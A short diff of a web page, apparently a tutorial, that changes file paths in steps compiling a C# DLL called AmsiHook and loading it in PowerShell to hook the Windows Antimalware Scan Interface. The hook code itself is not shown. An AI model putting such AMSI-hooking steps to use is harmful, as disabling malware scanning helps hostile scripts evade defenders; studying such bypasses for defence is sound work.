@@ -263,10 +263,10 @@ public class AmsiHook
 }
 </code></pre>
 <p>Next, compile the C# code into a DLL:</p>
-<pre><code class="language-sh">csc /target:library /out:/Users/luks/_code/thev/src/AmsiHook.dll /Users/luks/_code/thev/src/AmsiHook.cs
+<pre><code class="language-sh">csc /target:library /out:C:\git\code\amsidll\AmsiHook.dll C:\git\code\amsidll\AmsiHook.cs
 </code></pre>
 <p>Then, create a PowerShell script to load the DLL and hook AMSI functions:</p>
-<pre><code class="language-powershell">Add-Type -Path &quot;/Users/luks/_code/thev/src/AmsiHook.dll&quot;
+<pre><code class="language-powershell">Add-Type -Path &quot;C:\git\code\amsidll\AmsiHook.dll&quot;
 
 # Hook AMSI functions
 [AmsiHook]::HookAmsi()
